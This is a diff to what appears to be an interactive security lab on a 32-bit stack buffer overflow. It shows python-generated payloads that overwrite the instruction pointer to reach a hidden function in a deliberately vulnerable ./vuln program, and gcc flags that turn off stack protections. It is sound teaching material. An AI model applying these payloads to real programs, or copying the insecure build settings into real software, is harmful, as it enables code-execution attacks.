@@ -7,22 +7,22 @@
 ## python exploitation:
 
 As a reminder:
-- the secretHiddenFunction address is `\xd7\x92\x04\x08` in python
+- the secretHiddenFunction address is `\xce\x92\x04\x08` in python
 - The payload is `./vuln AAAAAAAAAAAAAAAABBBBCCCCDDDDEEEE` with EEEE to be replaced by the above address.
 
 In python2 we can generate a payload with:
 
-`python -c "print('AAAAAAAAAAAAAAAABBBBCCCCDDDD'+'\xd7\x92\x04\x08')"`{{execute}}
+`python -c "print('AAAAAAAAAAAAAAAABBBBCCCCDDDD'+'\xce\x92\x04\x08')"`{{execute}}
 
 The 28 characters are called the offset and could be any character. The next 4 bytes are used to overwrite the EIP and must point to the function we want to execute.
 
 Let's try the exploit:
 
-`./vuln \`python -c "print('AAAAAAAAAAAAAAAABBBBCCCCDDDD'+'\xd7\x92\x04\x08')"\``{{execute}}
+`./vuln \`python -c "print('AAAAAAAAAAAAAAAABBBBCCCCDDDD'+'\xce\x92\x04\x08')"\``{{execute}}
 
 or 
 
-`./vuln $(python -c "print('AAAAAAAAAAAAAAAABBBBCCCCDDDD'+'\xd7\x92\x04\x08')")`{{execute}}
+`./vuln $(python -c "print('AAAAAAAAAAAAAAAABBBBCCCCDDDD'+'\xce\x92\x04\x08')")`{{execute}}
 
 Et voila! we have successfully reached a piece of code which is never called, and we no longer have any segmentation fault. Which means that the signal handler is not a strong mitigation.
 
@@ -32,22 +32,23 @@ Because our buffer size is only 16, it is quite easy to type by hand a larger se
 
 Let's modify the size of the buffer to 2048. We will use a command-line editor called vim (Feel free to use `nano` if you are not comfortable with `vim`). If you are stuck in vim, you can quit at any time by typing `<ESC>qa!`.
 
+### Exercise 1: Recompile the programme with a larger buffer
+
 1. open the source file in vim: `vim ./vuln.c`{{execute}}
 2. direct jump to the buffer size 16 by typing: `/16<ENTER>`
 3. change the word (cw) under the cursor with the value 2048: `cw2048`
 4. save and quit with: `<ESC>ZZ` or `<ESC>wq` (write then quit)
+5. Recompile: `gcc -m32 -O0 -fno-stack-protector -no-pie -z execstack  -o vuln vuln.c`{{execute}}
+6. Check the symbol address of the secretHiddenFunction
 
-Recompile:
+## Exercise 2: generate a large payload 
 
-`gcc -m32 -O0 -fno-stack-protector -no-pie -z execstack  -o vuln vuln.c`{{execute}}
+1. Generate a large payload: `python -c "print('A'*2048 + 'B'*4 + 'C'*4 + 'D'*4 + 'E'*4 + 'F'*4)"`{{execute}}
+2. Pass the payload as an argument to the ./vuln programme
+3. Identify in our payload which group of 4 bytes is overwriting the instruction pointer
+4. Replace the 4 bytes in our payload with the symbol address of the secretHiddenFunction)
+5. Execute the exploit
 
-## generate a large payload 
+Don't forget Endianess (a concept we will explore another time).
 
-`python -c "print('A'*2048 + 'B'*4 + 'C'*4 + 'D'*4 + 'E'*4 + 'F'*4)"`{{execute}}
-
-`./vuln $(python -c "print('A'*2048 + 'B'*4 + 'C'*4 + 'D'*4 + 'E'*4 + 'F'*4)")`{{execute}}
-
-`dmesg | tail -2`{{execute}}
-
-`./vuln $(python -c "print('A'*2048 + 'B'*4 + 'C'*4 + 'D'*4 + '\xd7\x92\x04\x08')")`{{execute}}
-
+Have you been successful to get the secretPassword? if Yes, move to next step, otherwise try harder.
